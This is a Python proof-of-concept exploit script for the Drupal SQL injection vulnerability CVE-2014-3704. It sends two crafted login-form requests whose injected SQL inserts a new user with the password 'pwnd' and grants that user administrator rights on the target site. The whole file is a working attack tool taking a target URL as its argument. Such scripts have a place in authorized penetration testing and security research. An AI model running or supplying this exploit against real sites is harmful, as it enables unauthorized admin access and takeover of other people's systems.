#!/usr/bin/python
# drupalSQLi.py -- a simple PoC for the Drupal SQLi vuln (CVE-2014-3704)                       
# Author: Mike Czumak (T_v3rn1x) - @SecuritySift
# You are free to share and/or reuse all or portions of this code as long as it's not for commercial purposes
# Absolutely no warranty or promises of reliability, accuracy, or performance. Use at your own risk
 
import sys
import socket
import urllib, urllib2
import argparse
import urlparse
 
class print_colors:
    SUCCESS = '\033[92m'
    ERROR = '\033[91m'
    END = '\033[0m'
 
	
#################################################
###############    Args/Usage     ###############
#################################################
		
def get_args():
 
	parser = argparse.ArgumentParser( prog="drupalSQLi.py", 
									  formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
									  epilog= '''
									  This script will exploit the Drupal SQL injection vulnerability (CVE-2014-3704) 
									  by adding a new user with admin privileges. Password will be `pwnd`.''')
	
	parser.add_argument("target", help="URL of target Drupal site")								  
	parser.add_argument("name", help="Username to Add")
	parser.add_argument("-u", "--uid", default="99999", help="User Id for new user (default = 99999)")
	parser.add_argument("-r", "--rid", default="3", help="rid for admin user (default = 3)")
	
	args = parser.parse_args()
		
	return args
 
#################################################
###############   Print Function  ###############
#################################################
 
''' universal print function with formatting '''
def print_msg (msgtype, msgcontent):
	endcolor = print_colors.END
		
	if msgtype == "error":
		startcolor = print_colors.ERROR
		print("%s[!] ERROR: %s%s" % (startcolor, msgcontent, endcolor))
	
	elif msgtype == "success":
		startcolor = print_colors.SUCCESS
		print("%s[*] SUCCESS: %s%s" % (startcolor, msgcontent, endcolor))
	
	else:
		print("%s" % (msgcontent))
 
#################################################
############        EXPLOIT         #############
#################################################
 
''' SQL Injection Exploit to Add Admin User '''
 
def pwn_target(target, uname, uid, rid):
	target = target + "?destination=node"
	pass_hash = urllib.quote_plus("$S$DIkdNZqdxqh7Tmufxs8l1vAu0wdzxF//smWKAcjCv45KWjK0YFBg") # pass = pwnd
	create_user = "name[0;insert%20into%20users%20values%20("+uid+",'"+uname+"','"+pass_hash+"','pwnd@pwnd.pwn','','',NULL,0,0,0,1,NULL,'',0,'',NULL);#%20%20]=test&name[0]=test&pass=test&form_id=user_login_block&op=Log+in";
	grant_privs = "name[0;insert%20into%20users_roles%20values%20("+uid+","+rid+");#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in";
 
	try:  
		req = urllib2.Request(target, create_user)
		res = urllib2.urlopen(req).read()
		req = urllib2.Request(target, grant_privs)
		res = urllib2.urlopen(req).read()
		print_msg("success", ("Admin user '%s' should now be added with password 'pwnd' and uid of %s\nNavigate to %s and login with these credentials" % (uname, uid, target)))
 
	except:
		print_msg("error", ( "[%s] %s%s" % (str(target), str(sys.exc_info()[0]), str(sys.exc_info()[1]))))
 
 
#################################################
###############        Main       ###############
#################################################
 
def main():
	print
	print '============================================================================='
	print '|                  DRUPAL SQL INJECTIION DEMO (CVE-2014-3704)               |'
	print '|               Author: Mike Czumak (T_v3rn1x) - @SecuritySift              |'
	print '=============================================================================\n'
	
	args = get_args() # get the cl args
	pwn_target(args.target.strip(), args.name.strip(), args.uid.strip(), args.rid.strip())
 
		
if __name__ == '__main__':
	main()
